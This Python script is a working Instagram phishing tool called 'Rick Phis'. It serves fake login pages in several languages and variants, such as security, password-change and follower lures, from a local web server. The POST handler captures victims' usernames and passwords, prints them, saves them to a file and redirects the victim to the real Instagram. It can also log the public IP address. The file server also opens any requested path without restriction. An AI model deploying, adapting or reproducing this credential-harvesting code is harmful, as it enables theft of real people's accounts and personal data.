from http.server import BaseHTTPRequestHandler, HTTPServer
from colorama import Fore, init
import argparse
import requests
import socket

init()

red_color = Fore.RED
white_color = Fore.WHITE
yellow_color = Fore.YELLOW

name = """  
  _____  _      _      _____  _     _     
 |  __ \\(_)    | |    |  __ \\| |   (_)    
 | |__) |_  ___| | __ | |__) | |__  _ ___ 
 |  _  /| |/ __| |/ / |  ___/| '_ \\| / __|
 | | \\ \\| | (__|   <  | |    | | | | \\__ \\
 |_|  \\_\\_|\\___|_|\\_\\ |_|    |_| |_|___/"""

accounts = """[1] Normal Login [2] Security Login[3] Change-password Login[4] Verify Login[5] Get-Followers Login[6] CLD Tools          
        """
print(red_color + name)
print(Fore.WHITE + "\n                     by https://github.com/Rickidevs\n")
parts = accounts.split('[')
for part in parts:
    if part.startswith('1] Normal'):
        print(f'{red_color}[{white_color}1{red_color}] {yellow_color} Normal ', end='')
    elif part.startswith('2] Security'):
        print(f'          {red_color}[{white_color}2{red_color}] {yellow_color} Security ', end='')
    elif part.startswith('3] Change'):
        print(f'\n{red_color}[{white_color}3{red_color}] {yellow_color} Change-password ', end='')
    elif part.startswith('4] Verify'):
        print(f' {red_color}[{white_color}4{red_color}] {yellow_color} Verify ', end='')
    elif part.startswith('5] Get'):
        print(f'    \n{red_color}[{white_color}5{red_color}] {yellow_color} Get-Followers ', end='')
    elif part.startswith('6] CLD'):
        print(f'   {red_color}[{white_color}6{red_color}] {yellow_color} CLD Tools', end='\n',)
    else:
        print(part, end='')

language_mapping = {
    'ar': "htmls\\ar.html",
    'az': "htmls\\az.html",
    'ch': "htmls\\ch.html",
    'en': "htmls\\index.html",
    'fr': "htmls\\fr.html",
    'de': "htmls\\de.html",
    'it': "htmls\\it.html",
    'ko': "htmls\\ko.html",
    'ru': "htmls\\ru.html",
    'es': "htmls\\es.html",
    'tr': "htmls\\tr.html"
}

parser = argparse.ArgumentParser(description='Process site arguments.')
parser.add_argument('--site', type=int, required=True, help='Site number')
parser.add_argument('--lang', type=str, default='en', help='Language code')
parser.add_argument('--port', type=int, default=0, help='Port number')
parser.add_argument('--getip', action='store_true', help='Get public IP address')

while True:
    try:
        user_input = input("Enter your choice in the format --site <number> --lang <language_code> [--port <port>] [--getip]: ").strip()
        args = parser.parse_args(user_input.split())

        chosen = args.site
        lang = args.lang
        port = args.port
        get_ip = args.getip

        web_site = language_mapping.get(lang.lower())
        if not web_site:
            raise ValueError("Invalid language code.")
        
        break  # Doğru girdi alındı, döngüden çık
    except (ValueError, IndexError, SystemExit) as e:
        print(Fore.RED + f"Invalid input. {e}. Please enter your choice in the format --site <number> --lang <language_code> [--port <port>] [--getip].")
        continue  # Hatalı girdi alındı, döngü devam etsin
print(Fore.GREEN)

class MyHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        file_path = self.path.strip('/')
        if file_path == '':
            file_path = web_site

        try:
            if file_path.endswith('.css'):
                with open(file_path, 'rb') as file:
                    content = file.read()
                    self.send_response(200)
                    self.send_header('Content-type', 'text/css')
                    self.end_headers()
                    self.wfile.write(content)
            else:
                with open(file_path, 'rb') as file:
                    content = file.read()
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    self.wfile.write(content)
        except FileNotFoundError:
            self.send_error(404, f'File Not Found: {self.path}')
        except Exception as e:
            self.send_error(500, f'Server Error: {e}')

    def do_POST(self):
        try:
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            post_data = post_data.split('&')
            data_dict = {}
            for item in post_data:
                key, value = item.split('=')
                data_dict[key] = value

            public_ip = self.get_public_ip() if get_ip else "IP logging disabled"
            
            print(Fore.RED, "Username:", data_dict['username'])
            print(Fore.RED, "Password:", data_dict['password'])
            print(Fore.RED, "Address:", public_ip, Fore.RESET)

            self.send_response(302)
            self.send_header('Location', 'https://instagram.com')
            self.end_headers()

            with open('data.py', 'w') as file:
                file.write(f"Username = '{data_dict['username']}'\nPassword = '{data_dict['password']}'")

        except Exception as e:
            self.send_error(500, f'Failed to process POST request: {e}')


    def get_public_ip(self):
        try:
            response = requests.get('https://ipleak.net/json/')
            return response.json()['ip']
        except Exception as e:
            print("Failed to obtain public IP address:", e)
            return None

def get_ip_address():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('google.com', 80))
        ip_address = s.getsockname()[0]
    except Exception as e:
        print("Failed to obtain IP address:", e)
        ip_address = None
    finally:
        s.close()
    return ip_address

def find_empty_port(start_port=8000, end_port=65535):
    for port in range(start_port, end_port + 1):
        if not is_port_in_use(port):
            return port
    print("No free ports were found in the specified range.")
    return None

def is_port_in_use(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind(('localhost', port))
        s.close()
        return False
    except OSError:
        return True

host = get_ip_address()
if port:
    if is_port_in_use(port):
        print(Fore.RED, f"The specified port {port} is already in use.")
        exit()
    c_port = port
else:
    c_port = find_empty_port()

if c_port:
    try:
        server = HTTPServer((host, c_port), MyHTTPRequestHandler)
        print(f"Server is started on: http://{host}:{c_port}/\n", Fore.RESET)
        server.serve_forever()
    except Exception as e:
        print(Fore.RED, f"Failed to start server: {e}")
else:
    print(Fore.RED,"No free port found.")
